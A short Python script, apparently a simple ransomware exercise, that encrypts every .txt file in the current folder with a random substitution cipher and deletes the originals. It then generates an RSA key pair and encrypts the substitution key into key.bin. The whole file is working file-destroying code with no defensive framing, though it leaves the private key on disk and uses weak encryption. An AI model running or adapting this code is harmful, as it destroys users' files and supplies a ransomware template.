import os
import random

from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA

# substitution cipher
alphabet = "abcdefghijklmnopqrstuvwxyz"
sub_cypher = random.sample(alphabet, len(alphabet))
# print(sub_cypher)

cwd = os.getcwd()
folder = os.listdir(cwd)

for item in folder:
    if item.endswith(".txt"):
        text = open(item, "r")
        result = ""
        for letter in text.read():
            if letter.lower() in alphabet:
                result += sub_cypher[alphabet.find(letter.lower())]
            else:
                result += letter

        with open(item.split('.')[0] + ".enc", "w") as f:
            f.write(result)
            text.close()
            os.remove(item)

# Generate RSA keys
key = RSA.generate(2048)
private_key = key.export_key()
file_out = open("private.pem", "wb")
file_out.write(private_key)
file_out.close()

public_key = key.public_key().export_key()
file_out = open("receiver.pem", "wb")
file_out.write(public_key)
file_out.close()

# encryption
recipient_key = RSA.import_key(open("receiver.pem").read())
data = bytes('|'.join(sub_cypher).encode('utf-8'))
file_out = open("key.bin", "wb")

cipher_rsa = PKCS1_OAEP.new(recipient_key)
enc_data = cipher_rsa.encrypt(data)
file_out.write(enc_data)
file_out.close()
